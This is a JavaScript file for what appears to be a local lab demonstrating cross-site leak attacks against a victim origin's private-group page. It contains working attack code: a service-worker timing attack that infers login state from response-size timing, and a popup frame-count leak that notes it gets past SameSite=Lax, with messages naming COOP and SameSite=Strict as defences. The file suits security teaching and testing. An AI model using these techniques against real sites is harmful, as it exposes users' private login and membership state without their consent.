const victimOrigin = document.body.dataset.victimOrigin;
const targetUrl = `${victimOrigin}/private-group`;

const timingOut = document.getElementById('timingOut');
const popupOut = document.getElementById('popupOut');
const runTimingBtn = document.getElementById('runTimingBtn');
const clearHistoryBtn = document.getElementById('clearHistoryBtn');
const runPopupBtn = document.getElementById('runPopupBtn');
const runLabelInput = document.getElementById('runLabel');
const historyTable = document.getElementById('historyTable');
const historyBody = document.getElementById('historyBody');

let runCount = 0;

if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js');
}

function appendHistoryRow(label, data) {
  runCount += 1;
  historyTable.hidden = false;

  const tr = document.createElement('tr');
  const cells = [
    String(runCount),
    label || `Run ${runCount}`,
    `${data.netMedian} ms (±${data.netSpread} ms)`,
    `${data.swMedian} ms (±${data.swSpread} ms)`,
  ];

  for (const text of cells) {
    const td = document.createElement('td');
    td.textContent = text;
    tr.appendChild(td);
  }
  historyBody.appendChild(tr);
}

async function runTimingAttack() {
  if (!('serviceWorker' in navigator)) {
    timingOut.textContent = 'Service Workers are unavailable in this context (use http://attacker.localhost:8002).';
    return;
  }

  runTimingBtn.disabled = true;
  timingOut.textContent = 'Measuring...';

  try {
    const reg = await navigator.serviceWorker.ready;
    const channel = new MessageChannel();

    channel.port1.onmessage = (event) => {
      runTimingBtn.disabled = false;
      const d = event.data;
      if (!d.ok) {
        timingOut.textContent = 'Error: ' + d.error;
        return;
      }

      timingOut.textContent =
        `Classic Network Fetch (median): ${d.netMedian} ms  (spread: ${d.netSpread} ms)\n` +
        `Service Worker Cache  (median): ${d.swMedian} ms  (spread: ${d.swSpread} ms)\n\n` +
        `Compare Logged OUT vs Logged IN on ${victimOrigin}.\n` +
        `A higher Service Worker median = larger response (Logged IN).`;

      appendHistoryRow(runLabelInput.value.trim(), d);
      runLabelInput.value = '';
    };

    reg.active.postMessage({ target: targetUrl }, [channel.port2]);
  } catch (err) {
    runTimingBtn.disabled = false;
    timingOut.textContent = 'Error: ' + err;
  }
}

function runPopupLeak() {
  popupOut.textContent = 'Opening popup...';
  const win = window.open(targetUrl, '_blank', 'width=400,height=300');

  setTimeout(() => {
    try {
      if (!win || win.closed) {
        popupOut.textContent = 'Popup handle severed (COOP: same-origin blocked the leak).';
        return;
      }
      const frameCount = win.length;
      win.close();
      if (frameCount > 0) {
        popupOut.textContent = `LEAKED: popup.length = ${frameCount} -> Victim is LOGGED IN (even with SameSite=Lax!).`;
      } else {
        popupOut.textContent = 'popup.length = 0 -> Victim is LOGGED OUT, or blocked by SameSite=Strict / Sec-Fetch-Site.';
      }
    } catch (err) {
      popupOut.textContent = 'Blocked by browser: ' + err;
    }
  }, 700);
}

runTimingBtn.addEventListener('click', runTimingAttack);
runPopupBtn.addEventListener('click', runPopupLeak);
clearHistoryBtn.addEventListener('click', () => {
  runCount = 0;
  historyBody.replaceChildren();
  historyTable.hidden = true;
});
